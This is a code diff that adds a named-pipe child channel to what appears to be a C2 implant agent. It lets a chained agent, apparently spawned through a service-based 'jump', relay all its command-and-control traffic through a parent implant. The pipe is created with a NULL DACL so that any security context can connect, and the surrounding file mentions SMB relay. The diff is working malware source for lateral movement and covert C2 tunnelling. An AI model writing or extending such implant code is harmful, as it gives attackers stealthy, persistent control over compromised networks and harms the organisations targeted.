@@ -306,3 +306,105 @@ BOOL smb_relay_pending(void) {
     /* Not used directly — the relay is handled in the server thread */
     return g_server_running;
 }
+
+/* ─── Pipe Child Channel (chained agent) ───
+ *
+ * When the agent is spawned via "jump" in chained mode, the binPath
+ * includes "PIPE:<name>".  The child creates a named pipe SERVER
+ * \\.\pipe\<name> and waits for the parent to connect (via auto-link).
+ * Once connected, ALL C2 traffic flows through this pipe — the parent
+ * relays it to the C2 server.
+ *
+ * Flow:
+ *   Child: CreateNamedPipeW → ConnectNamedPipe (blocks)
+ *   Parent: CreateFileW (connects via link) → relay thread
+ *   Child: pipe_write_framed(request) → pipe_read_framed(response)
+ *   Parent relay: read child request → channel_send_recv → write response
+ */
+
+BOOL g_pipe_child_mode = FALSE;
+char g_pipe_child_name[256] = {0};
+
+static HANDLE g_pipe_child_handle = INVALID_HANDLE_VALUE;
+
+BOOL pipe_child_init(void) {
+    if (!g_pipe_child_mode || g_pipe_child_name[0] == '\0')
+        return FALSE;
+
+    /* Build local pipe path: \\.\pipe\<name> */
+    char pipe_path[512];
+    snprintf(pipe_path, sizeof(pipe_path), "\\\\.\\pipe\\%s", g_pipe_child_name);
+
+    wchar_t wPipePath[512];
+    MultiByteToWideChar(CP_UTF8, 0, pipe_path, -1, wPipePath, 512);
+
+    /* Create pipe with NULL DACL so the parent can connect from any context */
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = FALSE;
+    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
+        SECURITY_DESCRIPTOR_MIN_LENGTH);
+    if (pSD) {
+        InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
+        SetSecurityDescriptorDacl(pSD, TRUE, NULL, FALSE);
+        sa.lpSecurityDescriptor = pSD;
+    } else {
+        sa.lpSecurityDescriptor = NULL;
+    }
+
+    g_pipe_child_handle = CreateNamedPipeW(
+        wPipePath,
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+        1,          /* Single instance — only parent connects */
+        65536,
+        65536,
+        0,
+        &sa
+    );
+
+    if (pSD) LocalFree(pSD);
+
+    if (g_pipe_child_handle == INVALID_HANDLE_VALUE)
+        return FALSE;
+
+    /* Block until parent connects (parent does auto-link after StartService) */
+    BOOL connected = ConnectNamedPipe(g_pipe_child_handle, NULL)
+                     ? TRUE
+                     : (GetLastError() == ERROR_PIPE_CONNECTED);
+
+    if (!connected) {
+        CloseHandle(g_pipe_child_handle);
+        g_pipe_child_handle = INVALID_HANDLE_VALUE;
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+void pipe_child_cleanup(void) {
+    if (g_pipe_child_handle != INVALID_HANDLE_VALUE) {
+        DisconnectNamedPipe(g_pipe_child_handle);
+        CloseHandle(g_pipe_child_handle);
+        g_pipe_child_handle = INVALID_HANDLE_VALUE;
+    }
+}
+
+BOOL pipe_child_send_recv(const unsigned char *packet, DWORD packet_len,
+                          unsigned char **response, DWORD *response_len) {
+    *response = NULL;
+    *response_len = 0;
+
+    if (g_pipe_child_handle == INVALID_HANDLE_VALUE)
+        return FALSE;
+
+    /* Write request to parent */
+    if (!pipe_write_framed(g_pipe_child_handle, packet, packet_len))
+        return FALSE;
+
+    /* Read response from parent */
+    if (!pipe_read_framed(g_pipe_child_handle, response, response_len))
+        return FALSE;
+
+    return TRUE;
+}
